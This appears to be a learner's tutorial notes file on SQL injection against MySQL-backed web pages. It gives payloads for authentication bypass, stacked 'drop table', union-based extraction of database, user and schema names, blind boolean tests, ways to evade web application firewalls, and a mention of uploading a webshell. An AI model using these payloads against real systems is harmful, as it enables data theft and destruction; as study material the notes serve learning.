# SQLinjection  
SQL is a famous database engine which is used with web server. In this situation, we can inject some SQL based code to get what we want <3.  
[Remember, practice makes perfect!](http://www.tutorialspoint.com/mysql_terminal_online.php)   
  
### Basic injection  
select password from users where name = '$id';  
So, what can we insert into $id?  
```  
5566 or 1=1 --  
5566; drop table hello  // execute drop table on second line  

rafael' or 1=1 --  // select password from users where name = 'rafael' or 1=1 --';  
rafael' or ''='    // select password from users where name = 'rafael' or ''=''; 
```  
  
### Union based  
Try on terminal what will **SELECT name, password FROM users WHERE id = 1 UNION SELECT 1, 2** happen?  
Ans: The union result will show as second result with matching column of name and password!  
Therefore, if we just want the info we need, we can make the first clause not exist...  
```
select name, password from users where id = 1 and 1 = 0 union select 1, 2;  
```
```
// 秀出當前的庫名,使用者
select name, password from users where id = 1 and 1 = 0 union select database(), system_user();
```
```  
// 可以得到目前資料庫下的表名,欄位名  
... union select column_name, table_name from information_schema.columns where table_schema=database(); 
```
```
// 也可以得到其他資料庫的名字!  
... union select table_schema, table_name from information_schema.columns;  
// 我的 k朋友說: 尋找 資料庫就應該用schemata, 回傳才不會重複而且有效率
... union select group_concat(schema_name) from information_schema.schemata;  // group_concat會將結果合併成一行,我們甚至不需要limit
```
```
// 可以得到所有table和column的名字 
... union select table_name, column_name from information_schema.columns;
```
```
// 回傳的結果太多 , 我們可以用 limit加以限制
// 網頁常常只能show唯一的結果
... union select table_name, column_name from information_schema.columns limit 1, 1;  
```  
[What's in information_schema.columns?](https://dev.mysql.com/doc/refman/5.7/en/columns-table.html)  
**group_concat() is also a litte trick.**

### Blind based   
When we cannot show results what we want, we still can find whether it exists or not.  
**True**: Web page shows normal.  
**False**: Web page shows error or blank.  
```  
... exists (select * from table);  // 配合 AND使用
```

### Time based  
Wait for my first time practice ><...
  
### Error based  
Show the result in error message!  
Wait for my first time practice ><... 
  
### WAF bypass
WAF is a defender for web.  
繞過手勢:  
- No 'space'  
  - ```select/**/username/**/from/**/users;```
  - ```union select 1,2``` -> ```union(select(1),2)```
- No 'select'...  
  - ```大小寫混淆 e.g. SelecT``` 
- No comma ','  
  - ```union select 1,2,3``` -> ```union select * from ((select 1)a join (select 2)b join (select 3)c);```   
- Encode your payload  
  - ```URL-ENCODE, HEXIDECIMAL, UNICODE```
  
### Webshell  
Based on the provilege of db user, we can upload shell to read or write to db.
